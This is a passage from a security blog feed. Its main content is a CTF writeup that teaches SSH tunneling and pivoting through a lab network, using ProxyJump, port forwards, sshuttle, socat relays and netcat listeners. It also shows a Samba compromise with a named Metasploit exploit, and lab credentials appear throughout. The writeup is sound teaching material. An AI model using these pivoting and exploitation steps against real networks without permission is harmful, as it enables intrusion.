  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8092_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/4_of_clubs.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This was a very nice ctf to brush up on some basic concepts. As we didn&amp;rsquo;t solve all challenges, that means we still have some
things to learn.&lt;/p&gt;
&lt;p&gt;Follow our team twitter account: &lt;a href=&#34;https://twitter.com/fr334aks&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr334aks&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Grayhat Red Team Village CTF 2020 WriteUp: Tunneler</title>
      <link>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</link>
      <pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</guid>
      <description></description>
      <content>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;During Grayhat Conference the Red Team Village hosted a beginner/intermediate CTF. Our CTF team fr334aks decided
to participate as we enjoyed the previous CTF created by them during DEFCON. I tackled the Tunneler challenges
that were exactly the same as the previous CTF. So with the less pressure it was a nice opportunity to make a writeup for
ssh tunneling techniques.&lt;/p&gt;
&lt;p&gt;I am writing this to serve as a personal reference for ssh tunneling as it has a very good practical aspect to use as an example. I will show different
ways these challenges could have been solved.&lt;/p&gt;
&lt;h2 id=&#34;1-bastion&#34;&gt;1. Bastion&lt;/h2&gt;
&lt;p&gt;Challenge description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to the bastion host 104.131.101.182

User: tunneler 
Password: tunneler 
SSH Port: 2222
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Solution:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh tunneler@104.131.101.182 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we ssh in, we get the following welcome message and also the bastion host is connected to multiple networks. We don&amp;rsquo;t see the ip we used to ssh in as
we are droppped in a docker container.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot1.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;2-browsing-websites&#34;&gt;2. Browsing Websites&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Browse to http://10.174.12.14/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge requires a local port forward.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using ssh command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh tunneler@104.131.101.182 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt; -L 8000:10.174.12.14:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then use curl to reach the website.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl 127.0.0.1:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config and add &lt;code&gt;LocalForward&lt;/code&gt; entry.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host bastion
 Hostname 104.131.101.182
 User tunneler
 Port 2222
 LocalForward 8000 10.174.12.14:80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then ssh into bastion and run curl as above.&lt;/p&gt;
&lt;p&gt;Solution 3:&lt;/p&gt;
&lt;p&gt;Running sshuttle to add a route to the target ip, this utilizes the ssh config for bastion without the localforward entry.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sshuttle -r bastion 10.174.12.14/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The beauty about this one is that I can reach the ip directly now.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl 10.174.12.14
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot2.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;3-ssh-in-tunnels&#34;&gt;3. SSH in tunnels&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SSH through the bastion to the pivot.

IP: 10.218.176.199 
User: whistler 
Pass: cocktailparty
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to jump through the bastion host and access the pivot.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using the &lt;code&gt;-J&lt;/code&gt; option in ssh command, this sets up a proxyjump.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config, this builds on the config we started with in the previous challenge and uses &lt;code&gt;ProxyJump&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then all we need to do is run the following command and see that pivot1 is also connected to more than one network.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot3.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;4-beacons-everywhere&#34;&gt;4. Beacons Everywhere&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Something is Beaconing to the pivot on port 58671-58680 
to ip 10.112.3.199, can you tunnel it back?

NOTE: IT IS THE SAME ON EACH PORT ONLY USE ONE PORT 
AND REMOVE YOUR TUNNEL WHEN YOU ARE DONE
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to achieve a remote port forward.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Using ssh command. First we proxyjump then perform the remote port forward.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:58671:127.0.0.1:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on another terminal window, open a netcat listener.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;Using ssh config. For this I&amp;rsquo;ll add a &lt;code&gt;RemoteForward&lt;/code&gt; option under pivot1.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion
 RemoteForward 58671 127.0.0.1:5000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we just run &lt;code&gt;ssh pivot1&lt;/code&gt; and open a netcat listener.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot4.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;5-beacons-annoying&#34;&gt;5. Beacons Annoying&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge needs a local port forward and a remote port forward.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Using ssh command, here we proxyjump and then forward localport 7000 to our target at port 7000.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 7000:10.112.3.88:7000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then connect using netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;7000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot5.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Next step is using a reverse port forward to receive the flag, we need to be quick to set the port as the flag is sent after 15s.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:17172:127.0.0.1:6000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on another terminal open a listener on port 6000.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;6000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot6.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It was an annoying beacon indeed, we needed 4 terminal panes open (I use tmux).&lt;/p&gt;
&lt;h2 id=&#34;6-scan-me&#34;&gt;6. Scan me&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;We deployed a ftp server but we forgot which port, find it and connect

ftp: 10.112.3.207 user: bishop pass: geese
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For this challenge we need to perform a portscan then a local portforward. However, port scanning over a tunnel can be quite slow
or sometimes fail. I ended up uploading an nmap binary to pivot1 and then scan the target.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Building on the previous ssh config, I&amp;rsquo;ll use scp to upload nmap. Nmap needs a services file to run, we need to upload that as well. Then from pivot1
we can perform a full portscan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;scp /opt/nmap-7.91SVN-x86_64-portable/nmap pivot1:/tmp
scp /opt/nmap-7.91SVN-x86_64-portable/data/nmap-services pivot1:/tmp
./nmap --datadir /tmp -p- 10.112.3.207
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot7.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After getting the port, let&amp;rsquo;s use sshuttle to add a route to the ftp server.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sshuttle -r pivot1 10.112.3.207/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next is to just connect to the ftp server, the flag was in the banner.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot8.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;7-another-pivot&#34;&gt;7. Another Pivot&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connect to the second pivot

IP: 10.112.3.12 
User: crease 
Pass: NoThatsaV
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;More proxyjumps.&lt;/p&gt;
&lt;p&gt;Solution 1:&lt;/p&gt;
&lt;p&gt;Multiple proxyjumps can be separated by a comma.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222,whistler@10.218.176.199 crease@10.112.3.12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Solution 2:&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll update ssh config with this new pivot.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host pivot2
 Hostname 10.112.3.12
 User crease
 ProxyJump pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then run&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This host is connected to multiple networks and it seems portforwarding is disabled here, therefore we&amp;rsquo;ll have some fun with socat!&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot9.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;8-snmp&#34;&gt;8. SNMP&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;There is a snmp server at 10.24.13.161
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge is interesting because snmp runs over udp, you can&amp;rsquo;t really create a udp tunnel. We&amp;rsquo;ll tunnel udp inside a tcp tunnel.
Since in pivot2 tunneling is disabled we&amp;rsquo;ll use socat.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot2 then open a tcp listener which redirects traffic to udp out to snmp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat TCP4-LISTEN:5000,fork UDP4:10.24.13.161:161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next we open a local portforward through pivot1 to the tcp port on pivot2 we opened above, I&amp;rsquo;ll use the full ssh command here.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then on our local machine we use socat again to redirect from local udp 161 to local port 5000 that would be forwarded by the above tunnel.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo socat UDP4-LISTEN:161,fork TCP:localhost:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then finally we run snmpwalk against localhost and the traffic is forwarded through the long tunnel created.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;snmpwalk -v1 -c public localhost
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot10.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;9-samba&#34;&gt;9. Samba&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;There is a samba server at 10.24.13.10, find a flag sitting in the root file system /

nothing to find in the shares
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Similar to the snmp one above we&amp;rsquo;ll use socat to tunnel to the samba server.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot2 and use socat to redirect traffic&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat -v TCP-LISTEN:5000,fork TCP:10.24.13.10:445
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then perform a local portforward through pivot1 to pivot2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on the challenge description, we need to access the root file system and nothing is in the shares. Sounds like
we need to exploit it as there&amp;rsquo;s no other way to access the root file system.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;Run nmap to find the samba version and check for exploit in exploitdb using searchsploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sC -sV -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; 127.0.0.1
searchsploit samba
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot11.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;There are several metasploit exploits listed for samba therefore we&amp;rsquo;ll use it.
The exploit that worked is &lt;code&gt;exploit/linux/samba/is_known_pipename&lt;/code&gt; and we get the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot12.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;10-browsing-website-2&#34;&gt;10. Browsing website 2&lt;/h2&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Browse to http://2a02:6b8:b010:9010:1::86/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge shows portforwarding from ipv4 to ipv6. We&amp;rsquo;ll use socat too on this one.&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;First we ssh into pivot1 then use socat to redirect traffic from ipv4 to ipv6.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;socat -v TCP-LISTEN:5000,fork TCP6:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2a02:6b8:b010:9010:1::86&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then forward local port 5000 through pivot1 to pivot 2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh pivot1 -L 5000:10.112.3.12:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then make the web request to local port 5000 which will be forwarded through the tunnel created.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl localhost:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/screenshot13.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The final base ssh config looked like this without the port forwards:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host bastion
 Hostname 104.131.101.182
 User tunneler
 Port 2222

Host pivot1
 Hostname 10.218.176.199
 User whistler
 ProxyJump bastion

Host pivot2
 Hostname 10.112.3.12
 User crease
 ProxyJump pivot1
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;There are several techniques to make your tunneling much easier, for quick use like in a ctf I think crafting the full ssh command is better and
faster. For frequent connection, using sshuttle combined with a good ssh config can make your life much easier.&lt;/p&gt;
&lt;p&gt;After all those connections here&amp;rsquo;s a Network Diagram that visualizes the access we were able to achieve with the tunnels:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/grayhat_2020/Tunneler.png&#34;  alt=&#34;grayhat_redteam_ctf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Here&amp;rsquo;s a nice writeup by &lt;a href=&#34;https://twitter.com/Rayhan0x01&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Rayhan0x01&lt;/a&gt;

 on how he used a different approach using metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;https://rayhan0x01.github.io/ctf/2020/08/08/defcon-redteamvillage-ctf-tunneler-1,2,3,4,5,7,9.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;p&gt;Some resources I think are helpful in understanding ssh tunneling properly.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;1. https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump
2. https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/
3. https://book.hacktricks.xyz/tunneling-and-port-forwarding
4. https://linuxize.com/post/how-to-setup-ssh-tunneling/
5. https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/
6. https://app.cyberranges.com/scenario/5d5c06ed960f032f2eadd733
7. https://app.cyberranges.com/scenario/5d5eaf28960f032f2eae6add
8. https://app.cyberranges.com/scenario/5d640b0c960f032f2eb033a8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>RaziCTF 2020 WriteUp: Chasing a lock</title>
      <link>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</link>
      <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I recently participated in &lt;a href=&#34;https://ctftime.org/event/1167&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RaziCTF 2020&lt;/a&gt;

 with team
&lt;a href=&#34;https://ctftime.org/team/112710&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr344aks&lt;/a&gt;

 and I was able to solve an android challenge that I thought
needs a proper writeup.
I was able to reverse engineer the provided app and use frida for dynamic analysis for a quick win.&lt;/p&gt;
&lt;h3 id=&#34;challenge-description&#34;&gt;Challenge Description:&lt;/h3&gt;

